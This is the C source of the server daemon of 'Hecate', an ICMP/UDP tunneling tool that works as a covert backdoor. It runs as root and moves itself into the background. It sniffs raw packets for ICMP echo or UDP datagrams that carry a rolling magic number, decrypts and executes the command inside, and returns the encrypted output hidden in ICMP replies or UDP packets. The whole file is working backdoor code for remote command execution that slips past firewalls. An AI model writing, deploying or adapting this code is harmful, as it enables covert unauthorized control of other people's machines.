/*
 * SERVER.C  	HECATE PROJECT V1.0, ICMP/UDP TUNNELING TOOL
 *		-by the epiknet #ioc communauty, ioc@rootshell.be  
 * 
 *		DAEMON CODE
 *		~~~~~~~~~~~
 *	
 *		Tested on Linux Redhat 9.0 & Mandrake 9.1
 *     
 */

#include 	<sys/types.h>
#include 	<sys/socket.h>
#include 	<linux/if_ether.h> 
#include 	<netinet/ip_icmp.h> 
#include 	<netinet/udp.h>
#include 	"hecate.h"


struct udphdr 		*udp;
struct icmphdr 		*icmp;
struct iphdr 		*ip;
struct ethhdr		*eth;
struct hostent 		*target;
char 			*data;



void
close_server(void)
{
	kill(getppid(), SIGKILL);
	exit(1);
}




int main(int argc, char *argv[])
{

	int i, o, c;

	int sock_recv;
	int seqnum, src_port, dest_port;
	int base_num, magic_num = DEFAULT_NUM;
	u_long 	client_addr = 0, server_addr = 0;


	/* MAGIC_NUM STUFF */
	i = INCREMENT;
	base_num = magic_num;
	seqnum = magic_num;
	dest_port = 0;
	src_port = magic_num;


	while ((o = getopt(argc,argv,"m:")) != -1)
		switch(o)
		{
			case 'm':
				magic_num = atoi(optarg);
				base_num = magic_num;
				seqnum = magic_num;
				src_port = magic_num;
				break;

	    		default:
	   			printf("Usage : %s [-m <magic_num>]\n", argv[0]);
				exit(1);
	  	}


	if(geteuid() != 0){
		printf("%s : %s\n", argv[0], NEED_ROOT);
		exit(1);
	}
	

	/* Hello, World! */
	printf("%s%s%s",COLORON, GREETZ, COLOROFF);
	printf("%s, using num %d\n", HIDEME, magic_num);
	
	
	if((go_background(argv[0])) == -1){
		fprintf(stderr, "go_background() failed, aborting!\n");
		exit(-1);
	}


	/***********************************
	 * SERVER IS WAITING FOR A REQUEST *
	 ***********************************/
	while(1)
	{

		if((sock_recv = socket(AF_INET, SOCK_PACKET, htons(ETH_P_ALL))) < 0)
			exit(-1);
			
		/* erase previous dgram */
		bzero(&packet_to_recv, PACKET_SIZE);

  		if(recvfrom(sock_recv, (char *)&packet_to_recv, PACKET_SIZE, 0, 0, 0) < 0)
			exit(-1);



	
		/***********************************
		 * STEP 1: DEAL WITH ICMP DATAGRAM *
		 ***********************************/
		ip = (struct iphdr *)(packet_to_recv + sizeof(struct ethhdr));
		if(ip->protocol == IPPROTO_ICMP)
		{
			icmp = (struct icmphdr *)(packet_to_recv + sizeof(struct ethhdr) + 20);
			data = (char *)(packet_to_recv + sizeof(struct ethhdr) + 20 + 8);

			/* reset magic_num counter */
			if(icmp->seq == htons(base_num))
				magic_num = base_num;
		
			if(icmp->type == ICMP_ECHO && icmp->seq == htons(magic_num))
			{
				magic_num+=i;
				seqnum = magic_num;
	
				/* for the reply */
				seqnum = magic_num;
				client_addr = lookup((char *)inet_ntoa(*(struct in_addr *)&ip->saddr));
				server_addr = lookup((char *)inet_ntoa(*(struct in_addr *)&ip->daddr)); 
				
				/* decrypt */
				do_crypt(data, clear_cmd);

				if(strstr(clear_cmd, TURNOFF)!=NULL)
					close_server();

				/* execute cmd */
      				if((proc_data(clear_cmd, clear_data)) == -1)
					goto end;
				
				do_crypt(clear_data, crypted_data); 
				send_ICMP(ICMP_ECHOREPLY, seqnum, client_addr, server_addr, crypted_data, 0);
				
				magic_num+=i;
				seqnum = magic_num;
	
			}
		}


		/********************************** 
		 * STEP 2: DEAL WITH UDP DATAGRAM *
		 **********************************/
		if(ip->protocol == IPPROTO_UDP)
		{
			udp = (struct udphdr *)(packet_to_recv + sizeof(struct ethhdr) + 20);
			data = (char *)(packet_to_recv + sizeof(struct ethhdr) + 20 + 8); 

			/* reset magic_num counter */
			if(udp->source == htons(base_num))
				magic_num = base_num;

			if(udp->source == htons(magic_num))
			{	
				magic_num+=i;
				
				/* for the reply */
				dest_port = random();
				src_port = magic_num;
				client_addr = lookup((char *)inet_ntoa(*(struct in_addr *)&ip->saddr));
				server_addr = lookup((char *)inet_ntoa(*(struct in_addr *)&ip->daddr));

				do_crypt(data, clear_cmd);
				if(strstr(clear_cmd, TURNOFF)!=NULL)
					close_server();

				/* execute cmd */
    				if((proc_data(clear_cmd, clear_data)) == -1)
					goto end;

				do_crypt(clear_data, crypted_data);
				send_UDP(dest_port, src_port, client_addr, server_addr, crypted_data, 0);

				magic_num+=i;
				src_port = magic_num;
	
			} 
		}

		end:
		bzero(&packet_to_send, PACKET_SIZE);
	}
}
              
